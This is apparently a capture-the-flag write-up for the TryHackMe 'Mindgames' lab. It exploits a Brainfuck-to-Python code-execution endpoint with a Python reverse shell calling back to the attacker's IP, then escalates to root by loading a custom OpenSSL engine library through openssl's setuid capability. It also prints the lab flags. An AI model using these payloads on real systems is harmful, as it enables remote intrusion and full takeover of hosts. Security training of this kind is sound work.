# Mindgames

Just a terrible idea...

No hints. Hack it. Don't give up if you get stuck, enumerate harder

# User flag.

*Hint: `user.txt`*

## Services enumeration

Let's start by enumerating the services with Nmap:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web code analysis

The web page shows 2 examples of brainfuck and a form to decode and execute the strings on the server.

```html
kali@kali:/data/Mindgames$ curl -s http://10.10.211.54
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Mindgames.</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/main.css">
    <script src="/main.js"></script>
</head>

<body onload="onLoad()">
    <h1>Sometimes, people have bad ideas.</h1>
    <h1>Sometimes those bad ideas get turned into a CTF box.</h1>
    <h1>I'm so sorry.</h1> <!-- That's a lie, I enjoyed making this. -->
    <p>Ever thought that programming was a little too easy? Well, I have just the product for you. Look at the example code below, then give it a go yourself!</p>
    <p>Like it? Purchase a license today for the low, low price of 0.009BTC/yr!</p>
    <h2>Hello, World</h2>
    <pre><code>+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.</code></pre>
    <h2>Fibonacci</h2>
    <pre><code>--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.</code></pre>
    <h2>Try before you buy.</h2>
    <form id="codeForm">
        <textarea id="code" placeholder="Enter your code here..."></textarea><br>
        <button>Run it!</button>
    </form>
    <p></p>
    <label for="outputBox">Program Output:</label>
    <pre id="outputBox"></pre>
</body>
</html>
```

The first examples prints "Hello, World":

~~~
POST /api/bf HTTP/1.1
Host: 10.10.211.54
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain
Origin: http://10.10.211.54
Content-Length: 207
Connection: close

+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.


HTTP/1.1 200 OK
Date: Fri, 04 Sep 2020 08:58:36 GMT
Content-Length: 13
Content-Type: text/plain; charset=utf-8
Connection: close

Hello, World
~~~

And the second example shows the first numbers of the Fibonacci suite:

~~~
POST /api/bf HTTP/1.1
Host: 10.10.211.54
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain
Origin: http://10.10.211.54
Content-Length: 947
Connection: close

--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.


HTTP/1.1 200 OK
Date: Fri, 04 Sep 2020 08:58:23 GMT
Content-Length: 24
Content-Type: text/plain; charset=utf-8
Connection: close

1
1
2
3
5
8
13
21
34
55
~~~

Intercepting the requests with Burp Suite reveals that the form sends the form input to the `/api/bf` location, asynchronously, thanks to the following javascript:

**main.js**

```javascript
async function postData(url = "", data = "") {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'text/plain'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: data // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
function onLoad() {
    document.querySelector("#codeForm").addEventListener("submit", function (event) {
        event.preventDefault()
        runCode()
    });
}
async function runCode() {
    const programBox = document.querySelector("#code")
    const outBox = document.querySelector("#outputBox")
    outBox.textContent = await (await postData("/api/bf", programBox.value)).text()
```

## Initial foothold

The program on the server, at location `/api/bf`, is likely python. Encoding a dumb string like `import oops` and sending the brainfuck encoded request produces the following response:

~~~
HTTP/1.1 200 OK
Date: Fri, 04 Sep 2020 09:10:09 GMT
Content-Length: 118
Content-Type: text/plain; charset=utf-8
Connection: close

Traceback (most recent call last):
  File "<string>", line 1, in <module>
ModuleNotFoundError: No module named 'oops'
~~~

The error message confirms our assumption and python is likely running. Let's try to encode a reverse shell in python.

## Reverse shell

Based on our previous assumption, we can encode the following payload:

~~~
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
~~~

Open a listener on your attacker machine (`rlwrap nc -nlvp 4444`), encode the reverse shell payload using [this website](https://www.splitbrain.org/_static/ook/) and send the request to the server with the following command:

~~~
$ curl -d "+++++ +++++ [REDACTED] ++ ++<]> ++.<" -X POST http://10.10.211.54/api/bf
~~~

We now have a reverse shell:

~~~
kali@kali:/data/Mindgames$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.211.54] 38032
bash: cannot set terminal process group (677): Inappropriate ioctl for device
bash: no job control in this shell
mindgames@mindgames:~/webserver$ id
id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
mindgames@mindgames:~/webserver$ 
~~~

## User flag

We are connected as `mindgames`, and we find the user flag in the home directory:

~~~
mindgames@mindgames:~/webserver$ cd /home
cd /home
mindgames@mindgames:/home$ ls -l
ls -l
total 8
drwxr-xr-x 6 mindgames mindgames 4096 May 11 15:36 mindgames
drwxr-x--- 5 tryhackme tryhackme 4096 May 11 15:25 tryhackme
mindgames@mindgames:/home$ cd mindgames
cd mindgames
mindgames@mindgames:~$ ls -la
ls -la
total 40
drwxr-xr-x 6 mindgames mindgames 4096 May 11 15:36 .
drwxr-xr-x 4 root      root      4096 May 11 13:48 ..
lrwxrwxrwx 1 mindgames mindgames    9 May 11 15:25 .bash_history -> /dev/null
-rw-r--r-- 1 mindgames mindgames  220 May 11 13:48 .bash_logout
-rw-r--r-- 1 mindgames mindgames 3771 May 11 13:48 .bashrc
drwx------ 2 mindgames mindgames 4096 May 11 14:07 .cache
drwx------ 3 mindgames mindgames 4096 May 11 14:07 .gnupg
drwxrwxr-x 3 mindgames mindgames 4096 May 11 15:24 .local
-rw-r--r-- 1 mindgames mindgames  807 May 11 13:48 .profile
-rw-rw-r-- 1 mindgames mindgames   38 May 11 15:24 user.txt
drwxrwxr-x 3 mindgames mindgames 4096 May 11 15:36 webserver
mindgames@mindgames:~$ cat user.txt
cat user.txt
thm{411f7d38247ff441ce4e134b459b6268}
~~~

From here, it may be a good idea to add your SSH public key (`~/.ssh/id_rsa.pub`) to `/home/mindgames/.ssh/authorized_keys` on the server to directly connect via SSH.

# Root flag.

*Hint: `/root/root.txt`*

## Server script started by systemd

The webserver (`/home/mindgames/webserver`) is started by `systemd` and it may have been a way to spawn a privileged reverse shell. However, the startup script forces the user to `mindgames`, which makes this option useless.

~~~
mindgames@mindgames:/etc/systemd/system/multi-user.target.wants$ cat server.service 
[Unit]
Description=Production Web Server

[Service]
User=mindgames
Group=mindgames
WorkingDirectory=/home/mindgames/webserver
ExecStart=/home/mindgames/webserver/server -p 80
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
mindgames@mindgames:/etc/systemd/system/multi-user.target.wants$ ls -la server.service 
lrwxrwxrwx 1 root root 34 May 11 15:33 server.service -> /etc/systemd/system/server.service
~~~

## Capabilities

Running `linpeas.sh` on the server will reveal that openssl has the `cap_setuid+ep` capabilities that we may exploit.

~~~
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
~~~

Check on [GTFOBins](https://gtfobins.github.io/gtfobins/openssl/#library-load) what we can exploit from `openssl` reveals an interesting section (Library load). It loads shared libraries that may be used to run code in the binary execution context.

Searching for examples on the Internet led me to this page (https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/) where I've found a C code example. Below is my adapted version that will spawn a root shell:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <openssl/engine.h>

static const char *engine_id = "root shell";
static const char *engine_name = "Spawns a root shell";

static int bind(ENGINE *e, const char *id)
{
    int ret = 0;

    if (!ENGINE_set_id(e, engine_id)) {
        fprintf(stderr, "ENGINE_set_id failed\n");
        goto end;
    }
    
    if (!ENGINE_set_name(e, engine_name)) {
        printf("ENGINE_set_name failed\n");
        goto end;
    }

    setuid(0);
    setgid(0);
    system("/bin/bash");
    
    ret = 1;
    
    end:
    return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

On my Kali machine, I created the `*.so` library as follows:

~~~
$ gcc -fPIC -o rootshell.o -c rootshell.c
$ gcc -shared -o rootshell.so -lcrypto rootshell.o
~~~

Transfer the resulting `rootshell.so` library on the target and execute it with `openssl` as follows:

~~~
mindgames@mindgames:~$ chmod +x rootshell.so 
mindgames@mindgames:~$ openssl req -engine ./rootshell.so
root@mindgames:~# id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
~~~

## Root flag

The root flag is in the `/root` directory:

~~~
root@mindgames:~# cat /root/root.txt 
thm{1974a617cc84c5b51411c283544ee254}
~~~
